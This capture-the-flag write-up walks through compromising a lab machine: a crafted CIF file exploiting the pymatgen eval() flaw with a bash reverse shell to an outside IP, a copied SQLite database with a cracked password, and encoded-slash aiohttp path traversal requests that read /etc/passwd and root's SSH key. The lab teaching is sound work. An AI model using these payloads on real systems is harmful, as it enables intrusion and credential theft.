
![Logo](Images/Logo.png)


# Attack Chain

```
└─► nmap → :22 SSH + :5000 Werkzeug/Python (Chemistry CIF Analyzer)
 └─► CVE-2024-23346 → pymatgen eval() in from_transformation_str()
  └─► malicious .cif → upload + View → RCE
   └─► reverse shell → Shell as app
    └─► code review app.py → SQLite at /home/app/instance/database.db
     └─► exfil database.db → strings → MD5 hashes
      └─► crack rosa's hash → rosa:unicorniosrosados
       └─► SSH rosa:unicorniosrosados → Shell as rosa
        └─► netstat → :8080 aiohttp/3.9.1 (loopback only)
         └─► SSH local port forward → :8080 reachable
          └─► ffuf → static dir /assets/
           └─► CVE-2024-23334 → slashes encoded as %2f, decoded by aiohttp
            └─► Arbitrary File Read → /root/.ssh/id_rsa
             └─► ssh -i id_rsa root → Shell as root
```
# Sommaire

- [Enumeration](#enumeration)
	- [Nmap](#nmap)
	- [Website - Port 5000](#website---port-5000)
- [CVE-2024-23346 - Arbitrary code execution](#cve-2024-23346---arbitrary-code-execution)
	- [Explanation](#explanation)
	- [Exploit](#exploit)
- [Lateral movement](#lateral-movement)
	- [Code Review](#code-review)
	- [Inspection of database File](#inspection-of-database-file)
	- [Shell as rosa](#shell-as-rosa)
- [Privilege Escalation](#privilege-escalation)
	- [Running Services](#running-services)
	- [Monitoring Site](#monitoring-site)
	- [CVE-2024-23334 - Arbitrary File Read](#cve-2024-23334---arbitrary-file-read)
		- [Explanation](#explanation)
		- [Finding a static directory](#finding-a-static-directory)
		- [Exploit](#exploit)
	- [Shell as root](#shell-as-root)
- [Bonus](#bonus)

---

# Enumeration

### Nmap

```
nmap -sVC 10.129.231.170               
Starting Nmap 7.93 ( https://nmap.org ) at 2026-05-26 12:39 EDT
Stats: 0:01:38 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 100.00% done; ETC: 12:40 (0:00:00 remaining)
Nmap scan report for 10.129.231.170
Host is up (0.048s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6fc20ae9d1d451d0bced9d020f26fdc (RSA)
|   256 f1ae1c3e1dea55446c2ff2568d623c2b (ECDSA)
|_  256 94421b78f25187073e9726c9a25c0a26 (ED25519)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.3 Python/3.9.5
|     Date: Tue, 26 May 2026 16:39:18 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 719
|     Vary: Cookie
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Chemistry - Home</title>
|     <link rel="stylesheet" href="/static/styles.css">
|     </head>
|     <body>
|     <div class="container">
|     class="title">Chemistry CIF Analyzer</h1>
|     <p>Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information File) and analyze the structural data contained within.</p>
|     <div class="buttons">
|     <center><a href="/login" class="btn">Login</a>
|     href="/register" class="btn">Register</a></center>
|     </div>
|     </div>
|     </body>
|   RTSPRequest: 
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.99 seconds
```

The Website is hosted by a Python Server as shown from this line
`Server: Werkzeug/3.0.3 Python/3.9.5`

### Website - Port 5000

Let's head onto the website. We must first register an account before accessing the functionnalities.

![Dashboard - CIF Upload](Images/Dashboard%20-%20CIF%20Upload.png)

We have the possibility to upload CIF file which will be probably parsed by the server. We can download an example by clicking on **here**, and it contains the following 

```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

# CVE-2024-23346 - Arbitrary code execution

The target might be vulnerable to **CVE-2024-23346** which is an Arbitrary Code Execution occuring when `.cif` file are being parsed.

### Explanation

The vulnerabilty is in the `JonesFaithfulTransformation.from_transformation_str()` method within the `pymatgen` library which insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. 

### Exploit

Let's craft a malicious `.cif`file with a reverse shell inside and upload it to the target to see if we get a reverse shell.

``` 
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.87/443 0>&1'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

After the upload, we start a listener using `penelope`, and we click on **View**.

```
peneloppe -i tun0 -p 443
[+] Listening for reverse shells on 10.10.16.87:443 
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from chemistry~10.129.231.170-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /root/.penelope/sessions/chemistry~10.129.231.170-Linux-x86_64/2026_05_26-13_08_22-266.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
app@chemistry:~$
```

The exploit worked, and we got a reverse shell as the user `app`.
# Lateral movement

Now that we have a foothold on the target, we can explore and try to leverage our privilege on the target.

```
app@chemistry:~$ ls
app.py  instance  static  templates  uploads
```

### Code Review

We are in the folder hosting the website on port 5000. Let's review the code of `app.py`.

```
app@chemistry:~$ cat app.py

from flask import Flask, render_template, request, redirect, url_for, flash
from werkzeug.utils import secure_filename
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from pymatgen.io.cif import CifParser
import hashlib
import os
import uuid

app = Flask(__name__)
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['UPLOAD_FOLDER'] = 'uploads/'
app.config['ALLOWED_EXTENSIONS'] = {'cif'}

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), nullable=False, unique=True)
    password = db.Column(db.String(150), nullable=False)

class Structure(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    filename = db.Column(db.String(150), nullable=False)
    identifier = db.Column(db.String(100), nullable=False, unique=True)

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

def calculate_density(structure):
    atomic_mass_Si = 28.0855
    num_atoms = 2
    mass_unit_cell = num_atoms * atomic_mass_Si
    mass_in_grams = mass_unit_cell * 1.66053906660e-24
    volume_in_cm3 = structure.lattice.volume * 1e-24
    density = mass_in_grams / volume_in_cm3
    return density

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if User.query.filter_by(username=username).first():
            flash('Username already exists.')
            return redirect(url_for('register'))
        hashed_password = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password=hashed_password)
        db.session.add(new_user)
        db.session.commit()
        login_user(new_user)
        return redirect(url_for('dashboard'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        user = User.query.filter_by(username=username).first()
        if user and user.password == hashlib.md5(password.encode()).hexdigest():
            login_user(user)
            return redirect(url_for('dashboard'))
        flash('Invalid credentials')
    return render_template('login.html')

@app.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('index'))

@app.route('/dashboard')
@login_required
def dashboard():
    structures = Structure.query.filter_by(user_id=current_user.id).all()
    return render_template('dashboard.html', structures=structures)

@app.route('/upload', methods=['POST'])
@login_required
def upload_file():
    if 'file' not in request.files:
        return redirect(request.url)
    file = request.files['file']
    if file.filename == '':
        return redirect(request.url)
    if file and allowed_file(file.filename):
        filename = secure_filename(file.filename)
        identifier = str(uuid.uuid4())
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], identifier + '_' + filename)
        file.save(filepath)
        new_structure = Structure(user_id=current_user.id, filename=filename, identifier=identifier)
        db.session.add(new_structure)
        db.session.commit()
        return redirect(url_for('dashboard'))
    return redirect(request.url)

@app.route('/structure/<identifier>')
@login_required
def show_structure(identifier):
    structure_entry = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure_entry.identifier + '_' + structure_entry.filename)
    parser = CifParser(filepath)
    structures = parser.parse_structures()
    
    structure_data = []
    for structure in structures:
        sites = [{
            'label': site.species_string,
            'x': site.frac_coords[0],
            'y': site.frac_coords[1],
            'z': site.frac_coords[2]
        } for site in structure.sites]
        
        lattice = structure.lattice
        lattice_data = {
            'a': lattice.a,
            'b': lattice.b,
            'c': lattice.c,
            'alpha': lattice.alpha,
            'beta': lattice.beta,
            'gamma': lattice.gamma,
            'volume': lattice.volume
        }
        
        density = calculate_density(structure)
        
        structure_data.append({
            'formula': structure.formula,
            'lattice': lattice_data,
            'density': density,
            'sites': sites
        })
    
    return render_template('structure.html', structures=structure_data)

@app.route('/delete_structure/<identifier>', methods=['POST'])
@login_required
def delete_structure(identifier):
    structure = Structure.query.filter_by(identifier=identifier, user_id=current_user.id).first_or_404()
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], structure.identifier + '_' + structure.filename)
    if os.path.exists(filepath):
        os.remove(filepath)
    db.session.delete(structure)
    db.session.commit()
    return redirect(url_for('dashboard'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', port=5000)

```

We got several informations. 

We have the secret key of the app, but this led nowhere.

```
app.config['SECRET_KEY'] = 'MyS3cretCh3mistry4PP'
```

And that there is a sqlite database attached to the app where it's file is located at `/home/app/instance/database.db`. 

### Inspection of database File
Let's transfer the file to our machine, and inspect it.

```
app@chemistry:~/instance$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```
wget http://10.129.231.170:8000/database.db
```

We can see that there is several hashes in the database.

![hash sqlite](Images/hash%20sqlite.png)

Let's see which user are on the target.

```
app@chemistry:~/instance$ ls /home
app  rosa
```

The user `rosa` is present on the target, let's attempt to crack it's hash.

![crack hash](Images/crack%20hash.png)

The attempt has been successfull and we retrieved the following credentials.

`rosa : unicorniosrosados`

### Shell as rosa

Let's try those credentials over SSH.

```
ssh rosa@10.129.*.*
unicorniosrosados

rosa@chesmistry:~$
```

We are connected as `rosa` on the target.
# Privilege Escalation

Let's look for a way to escalate our privilege once again.
### Running Services

There is a directory called `monitoring_site` under `/opt` which can't be accessed with our current user.

```
rosa@chemistry:/opt$ ls
monitoring_site
rosa@chemistry:/opt$ ls monitoring_site/
ls: cannot open directory 'monitoring_site/': Permission denied
```

This suggest that something else is running on the target, let's list what is listening with `netstat`.

```
rosa@chemistry:~$ netstat -tlnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -  
```

Let's forward the port to our machine via SSH 

```
ssh -L 8080:127.0.0.1:8080 rosa@10.129.231.170
```

### Monitoring Site

Let's see what the port 8080 reveals.

![site monitoring](Images/site%20monitoring.png)

The Website appears to host an application but nothing much can be done. It's probably somethind under work.

We can use `curl` to request it's header and see if something is interessting.

```
curl -i http://127.0.0.1:8080  
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Tue, 26 May 2026 17:39:32 GMT
Server: Python/3.9 aiohttp/3.9.1
```

The website is hosted on a Python Server with `aiohttp` on the **3.9.1** version

### CVE-2024-23334 - Arbitrary File Read

That version of `aiohttp` is vulnerable to **CVE-2024-23334**  which is an Arbitrary File Read.

##### Explanation

The option `follow_symlinks` can be used to determine whether to follow symbolic links outside the static root directory. When `follow_symlinks` is set to True, there is no validation to check if reading a file is within the root directory. This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system.

##### Finding a static directory

First we need to find a static directory in order to exploit the flaw.

```
ffuf -c -w `fzf-wordlists` -u "http://127.0.0.1:8080/FUZZ"              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://127.0.0.1:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 403, Size: 14, Words: 2, Lines: 1, Duration: 34ms]
```

There is the directory `assets`, which we will use for the exploit.

##### Exploit

A reverse proxy is set on the target, which means that the path is autoresolved and doesn't append `../` to our payload.

To bypass it, we can URL encode the `/`. Let's try to read `/etc/passwd` now.

```
curl http://127.0.0.1:8080/assets/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
<SNIP>
```

The CVE work as expected. We could grab the root flag from here, but we can target a sensitive file in order to get a shell on the target. We can try to see if there is an ssh key for root.

```
curl http://127.0.0.1:8080/assets/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2froot/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
<SNIP>
```

### Shell as root

It worked too, let's connect over ssh as root now.

```
chmod 600 id_rsa
``` 
```
ssh -i id_rsa root@10.129.231.170 
```


# Bonus

From the `app.py` file under `/opt/monitoring_site`. We notice the following line :

```
app.router.add_static('/assets/', path='static/', follow_symlinks=True)
```

This explains why the CVE worked, and why we could exploit the static path `/assets`
 to get an Arbitraty File Read.